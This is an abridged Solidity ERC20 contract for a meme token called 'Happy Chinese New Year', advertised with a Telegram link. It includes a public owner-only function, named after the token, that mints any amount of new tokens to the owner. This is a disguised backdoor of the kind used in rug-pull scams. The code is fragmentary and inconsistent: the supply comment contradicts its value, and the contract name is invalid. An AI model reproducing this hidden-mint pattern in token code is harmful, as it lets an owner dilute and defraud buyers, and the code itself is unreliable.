...
//
// $HappyChineseNewYear proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/Chinesenewyearr
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Happychinesenewyear(uint256 amount) public onlyOwner {
 _Happychinesenewyear(msg.sender, amount);
    }
    ...
    function _Happychinesenewyear(address account, uint256 amount) internal virtual {
...
contract $HappyChineseNewYear is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Happy Chinese New Year", "HAPPYCHINESENEWYEAR") {
     _Happychinesenewyear(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}